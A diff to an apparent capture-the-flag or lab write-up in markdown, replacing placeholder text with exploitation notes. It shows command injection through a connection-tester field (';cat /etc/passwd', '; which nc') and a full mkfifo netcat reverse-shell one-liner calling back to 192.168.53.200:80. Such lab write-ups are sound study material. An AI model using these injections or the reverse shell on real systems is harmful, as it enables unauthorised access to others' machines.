@@ -145,18 +145,25 @@ Enumerated top 200 UDP ports:
 #### I then typed ";cat /etc/passwd" (adding a semicolon at the end of 127.0.0.1) and found the below user "dylan" on the system: 
 
 ![](Pasted%20image%2020221018181441.png)
+#Command_Injection 
 
 #### Then typed "; which nc" and found the machine had nc installed:
 
 ![](Pasted%20image%2020221018181531.png)
 
-
+![](Pasted%20image%2020221018181603.png)
 
 ---
 
 # Exploitation
 ## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
+
+#### Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell 
+
+![](Pasted%20image%2020221018181728.png)
+
 
 ---
 
